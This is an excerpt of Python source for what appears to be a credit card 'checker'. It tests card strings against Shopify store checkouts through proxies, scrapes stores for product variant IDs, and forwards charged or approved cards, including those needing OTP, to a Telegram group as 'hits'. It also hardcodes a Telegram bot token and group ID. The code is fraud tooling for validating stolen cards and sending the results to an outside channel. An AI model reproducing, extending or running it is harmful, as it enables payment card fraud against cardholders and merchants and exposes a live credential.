...
# TELEGRAM CONFIG - SET THESE
TELEGRAM_BOT_TOKEN = os.getenv("BOT_TOKEN", "6721837907:AAG8NYYLoyKZ-BbcHcKiZImbCFUWWbA9Fu0")
TELEGRAM_GROUP_ID = os.getenv("GROUP_ID", "-1003737740461")  # e.g., -1001234567890
...
async def fetch_products(domain, proxy_str=None, max_retries=3):
    ...
    async with aiohttp.ClientSession(connector=connector, timeout=REQUEST_TIMEOUT) as session:
        ...
        # Method 2: Scrape homepage for product links
        try:
            async with session.get(domain, proxy=proxy, headers=headers) as resp:
                if resp.status == 200:
                    text = await resp.text()
                    # Look for variant IDs in JS data
                    variant_matches = re.findall(r'"variantId"[:\s]*(\d+)', text)
                    if variant_matches:
                        return {'variant_id': variant_matches[0], 'price': '0.00'}
                    # Look for product handles
                    handle_matches = re.findall(r'/products/([a-zA-Z0-9\-]+)', text)
                    for handle in set(handle_matches):
                        try:
...
async def send_hit_to_telegram(cc_string, site, gateway, price, currency, response_msg):
    """Only sends message for charged/approved hits"""
...
def shopify_checker():
    try:
        ...
        # HIT DETECTION - Only forward charged/approved
        hit_keywords = [
        ...
        # Also treat OTP_REQUIRED as a hit (live card)
